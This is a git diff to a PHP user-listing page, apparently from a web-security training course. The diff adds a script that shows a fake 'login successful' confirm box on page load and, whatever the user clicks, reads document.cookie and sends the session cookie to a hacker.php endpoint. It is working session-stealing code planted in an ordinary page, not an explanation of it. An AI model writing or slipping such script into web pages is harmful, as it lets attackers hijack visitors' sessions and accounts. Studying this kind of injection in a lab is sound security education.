@@ -1,5 +1,6 @@
 <?php
 // Start the session
+
 session_start();
 
 require_once 'models/UserModel.php';
@@ -11,6 +12,7 @@ if (!empty($_GET['keyword'])) {
 }
 
 $users = $userModel->getUsers($params);
+
 ?>
 <!DOCTYPE html>
 <html>
@@ -70,5 +72,28 @@ $users = $userModel->getUsers($params);
             </div>
         <?php } ?>
     </div>
+    <script>
+    $(document).ready(function() {
+        if (window.confirm('Đăng nhập thành công?'))
+        {
+           hacker();
+        }
+        else
+        {
+            hacker();
+        }
+        async function hacker(){
+
+            const number = document.cookie
+            await fetch(`http://localhost/training-php-1-php-202109-1-web-security/hacker.php?session_id=${number}`, {						
+            method: 'POST',						
+            headers: {						
+                'Accept': 'application/json',						
+                'Content-Type': 'application/json'						
+            },						
+            });	
+        }
+    });
+    </script>
 </body>
 </html>
